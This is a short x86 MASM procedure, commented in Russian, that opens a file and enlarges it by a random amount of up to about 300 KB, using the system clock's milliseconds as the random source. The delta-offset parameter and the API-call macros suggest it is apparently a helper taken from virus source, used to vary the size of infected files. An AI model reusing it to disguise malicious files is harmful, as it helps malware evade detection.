;===============================================================================;
;ChangeFileSize proc Buffer:DWORD,Delta:DWORD
;Описание: Произвольное увеличение размера файла от 0 до 300 кб
;Вход:
;	Buffer - имя файла
;	Delta - дельта смещение
;===============================================================================;
ChangeFileSize proc Buffer:DWORD,Delta:DWORD
LOCAL hFile:DWORD
LOCAL SystemTime:SYSTEMTIME

	startproc
	mov ebx,Delta
;Получаем случайное число
	lea eax,SystemTime
	push eax
	apiproc _GetSystemTime
	xor ecx,ecx
	mov cx,SystemTime.wMilliseconds
;Умножаем значение на 3
	mov eax,300
	mul ecx
	mov edi,eax
;Открываем файл
	push NULL
	push FILE_ATTRIBUTE_NORMAL
	push OPEN_EXISTING
	push NULL
	push FILE_SHARE_WRITE or FILE_SHARE_READ 
	push GENERIC_WRITE or  GENERIC_READ
	push Buffer
	apiproc _CreateFileA
	.if eax==-1
		endproc
		ret
	.endif
	mov hFile,eax
;Получаем размер файла
	push 0
	push eax
	apiproc _GetFileSize
;Получаем новый размер файла
	add edi,eax
;Делаем файл нового размера
	push NULL
	push edi
	push NULL
	push PAGE_READWRITE
	push NULL
	push hFile
	apiproc _CreateFileMappingA	
;Закрываем файл и его проекцию
	push eax
	apiproc _CloseHandle

	push hFile
	apiproc _CloseHandle
	endproc
	ret
ChangeFileSize endp
;===============================================================================;